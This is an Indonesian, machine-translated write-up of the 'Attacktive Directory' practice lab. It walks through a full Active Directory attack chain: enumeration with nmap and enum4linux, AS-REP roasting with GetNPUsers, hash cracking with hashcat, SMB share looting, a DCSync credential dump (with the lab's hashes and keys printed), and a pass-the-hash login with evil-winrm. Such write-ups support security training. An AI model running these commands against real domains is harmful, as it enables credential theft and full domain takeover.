---
title: "Direktori Agresif"
description: "Enum Enum4Linux: Port 88 - Kerberos kita melihat port kerberos terbuka jadi mari kita coba untuk menghitung nama pengguna menggunakan kerbrute Setelah penghitungan akun pengguna selesai, kita dapat"
lang: "id"
translationKey: "attacktive-directory"
category: "lab-writeups"
tags: ["Kerbrute", "AS-Rep Roasting", "smbmap", "Dcsync", "Active Directory", "Medium"]
publishDate: "2025-10-12"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "28a5fca1-ed80-803f-8734-eef086d8f00c"
notionUrl: "https://app.notion.com/p/Attacktive-Directory-28a5fca1ed80803f8734eef086d8f00c"
notionLastEdited: "2025-10-13T16:05:00.000Z"
---

# Enum

![](/images/attacktive-directory/faa439c5787e.png)

```javascript
# nmap command
nmap -sCV 10.10.159.7
# output nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 08:10 WIB
Stats: 0:07:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.79% done; ETC: 08:19 (0:02:01 remaining)
Stats: 0:08:30 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 81.68% done; ETC: 08:20 (0:01:54 remaining)
Stats: 0:11:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 97.47% done; ETC: 08:22 (0:00:18 remaining)
Nmap scan report for 10.10.159.7
Host is up (0.41s latency).
Not shown: 982 closed tcp ports (reset)
PORT     STATE    SERVICE       VERSION
53/tcp   open     domain        Simple DNS Plus
80/tcp   open     http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-12 01:22:48Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
555/tcp  filtered dsf
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     tcpwrapped
1090/tcp filtered ff-fms
2179/tcp filtered vmrdp
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
3389/tcp open     ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-12T01:23:25+00:00; +12s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-10-11T01:04:13
|_Not valid after:  2026-04-12T01:04:13
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-12T01:23:16+00:00
5555/tcp filtered freeciv
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-12T01:23:18
|_  start_date: N/A
|_clock-skew: mean: 12s, deviation: 0s, median: 12s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 791.14 seconds
```

Enum4Linux:

```javascript
# command enum4linux
enum4linux -a <IP>
# Output enum4linux
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 12 08:18:25 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.159.7
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.159.7 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.159.7 )================================

Looking up status of 10.10.159.7
No reply from 10.10.159.7

 ====================================( Session Check on 10.10.159.7 )====================================


[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

❯ sudo enum4linux -a 10.10.159.7
[sudo] password for kali: 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 12 08:23:09 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.159.7
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.159.7 )============================
                                                                                                                                                 
                                                                                                                                                 
[E] Can't find workgroup/domain                                                                                                                  
                                                                                                                                                 
                                                                                                                                                 

 ================================( Nbtstat Information for 10.10.159.7 )================================
                                                                                                                                                 
Looking up status of 10.10.159.7                                                                                                                 
No reply from 10.10.159.7

 ====================================( Session Check on 10.10.159.7 )====================================
                                                                                                                                                 
                                                                                                                                                 
[+] Server 10.10.159.7 allows sessions using username '', password ''                                                                            
                                                                                                                                                 
                                                                                                                                                 
 =================================( Getting domain SID for 10.10.159.7 )=================================
                                                                                                                                                 
Domain Name: THM-AD                                                                                                                              
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)                                                                                                   
                                                                                                                                                 
                                                                                                                                                 
 ===================================( OS information on 10.10.159.7 )===================================
                                                                                                                                                 
                                                                                                                                                 
[E] Can't get OS info with smbclient                                                                                                             
                                                                                                                                                 
                                                                                                                                                 
[+] Got OS info for 10.10.159.7 from srvinfo:                                                                                                    
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                           


 ========================================( Users on 10.10.159.7 )========================================
                                                                                                                                                 
                                                                                                                                                 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                             
                                                                                                                                                 
                                                                                                                                                 

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                              
                                                                                                                                                 
                                                                                                                                                 
 ==================================( Share Enumeration on 10.10.159.7 )==================================
                                                                                                                                                 
do_connect: Connection to 10.10.159.7 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                           

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.159.7                                                                                                      
                                                                                                                                                 
                                                                                                                                                 
 ============================( Password Policy Information for 10.10.159.7 )============================
                                                                                                                                                 
                                                                                                                                                 
[E] Unexpected error from polenum:                                                                                                               
                                                                                                                                                 
                                                                                                                                                 

[+] Attaching to 10.10.159.7 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.159.7)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                 
                                                                                                                                                 
                                                                                                                                                 

 =======================================( Groups on 10.10.159.7 )=======================================
                                                                                                                                                 
                                                                                                                                                 
[+] Getting builtin groups:                                                                                                                      
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting builtin group memberships:                                                                                                          
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting local groups:                                                                                                                       
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting local group memberships:                                                                                                            
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting domain groups:                                                                                                                      
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting domain group memberships:                                                                                                           
                                                                                                                                                 
                                                                                                                                                 
 ===================( Users on 10.10.159.7 via RID cycling (RIDS: 500-550,1000-1050) )===================
                                                                                                                                                 
                                                                                                                                                 
[I] Found new SID:                                                                                                                               
S-1-5-21-3591857110-2884097990-301047963                                                                                                         

[I] Found new SID:                                                                                                                               
S-1-5-21-3591857110-2884097990-301047963                                                                                                         

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''                                     
                                                                                                                                                 
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                                                         
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)


[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                      
                                                                                                                                                 
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                                                   
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

 ================================( Getting printer info for 10.10.159.7 )================================
                                                                                                                                                 
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                          


enum4linux complete on Sun Oct 12 08:45:16 2025
```

## Port 88 - Kerberos

Kita melihat port Kerberos terbuka, jadi mari kita coba untuk melakukan enumerasi nama pengguna menggunakan Kerbrute.

![](/images/attacktive-directory/4cb3de8bf14e.png)

Setelah enumerasi akun pengguna selesai, kita dapat mencoba menyalahgunakan fitur dalam Kerberos dengan metode serangan yang disebut ASREPRoasting. ASReproasting terjadi ketika akun pengguna memiliki hak istimewa "Tidak memerlukan Pra-Autentikasi". Ini berarti bahwa akun tersebut tidak
Anda perlu memberikan identitas yang valid sebelum meminta Tiket Kerberos pada akun pengguna yang ditentukan.

Sekarang, kita akan menggunakan salah satu alat impacket yang disebut `GetNPUsers.py` yang memungkinkan kita untuk menanyakan akun ASReproastable dari Pusat Distribusi Kunci. Perintah yang akan kita gunakan adalah:

```javascript
impacket-GetNPUsers -usersfile ~/Documents/OSCP/usernames.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.231.140 'spookysec.local/'
```

![](/images/attacktive-directory/b0da659038e9.png)

Kami hanya mendapatkan hash dari pengguna **svc-admin**, Setelah mendapatkan hash Kerberos, kemudian setelah mengidentifikasi hash tersebut, kami menemukan bahwa hash kami adalah `Kerberos 5 AS-REP etype 23` dari wiki hashcat [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

jadi mari kita pecahkan hash menggunakan hashcat

```javascript
hashcat -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt --force
```

![](/images/attacktive-directory/e28770024472.png)

Yey, kita berhasil memecahkan hash-nya, jadi mari kita gunakan kredensial (svc-admin:management2005) untuk melakukan enumerasi lebih lanjut.

## Port 139 & 445 - SMB

Melakukan enumerasi share SMB menggunakan kredensial yang telah kita peroleh pada langkah sebelumnya (svc-admin:management2005) menggunakan SMBMAP.

![](/images/attacktive-directory/500c55cb1f07.png)

Kami mendapatkan saham yang menarik, itu adalah saham cadangan, mari kita periksa isi saham tersebut.

![](/images/attacktive-directory/c74d823f0f35.png)

hmhmhm kita mendapatkan hash yang menarik, mari kita identifikasi jenis hash apa itu. menggunakan platform online [https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier)

![](/images/attacktive-directory/a98aaaa8c111.png)

![](/images/attacktive-directory/9b8cf6d1fdbb.png)

Kami mengidentifikasi bahwa itu dienkode base64 jadi kami mendekodenya menggunakan Cyberchef lalu, voila kami mendapatkan nama pengguna dan kata sandi baru `backup@spookysec.local:backup2517860`

Jadi, mari kita gunakan kredensial tersebut untuk melakukan enumerasi lebih lanjut.

![](/images/attacktive-directory/d3f500f24c97.png)

Karena pengguna saat ini adalah cadangan untuk DC, akun ini memiliki izin unik yang memungkinkan semua perubahan Active Directory disinkronkan dengan akun pengguna ini, termasuk hash kata sandi. Kita akan menggunakan salah satu alat impacket yang disebut `secretsdump` untuk mengambil hash kata sandi.

```javascript
# command impacket
impacket-secretsdump -just-dc spookysec.local/backup:backup2517860@10.10.236.34
# OUTPUT
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:71aa38dcac61b7c81e5f323a19eced2c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:e09061965dc1d748e421d546aaa37650d6c077f172460876bbab1d67ca881600
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:d18435becaf486140bf766b8caa94f2d
ATTACKTIVEDIREC$:des-cbc-md5:577a52d50d38c4e6
[*] Cleaning up... 
```

Dari serangan dcsync kita berhasil mendapatkan hash administrator, jadi mari kita coba melakukan serangan pass the hash untuk masuk ke server sebagai pengguna administrator menggunakan winrm jahat.

```javascript
evil-winrm -i 10.10.236.34 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

![](/images/attacktive-directory/2d4f60d84f8a.png)

Yey, kita berhasil masuk ke server sebagai pengguna administrator.
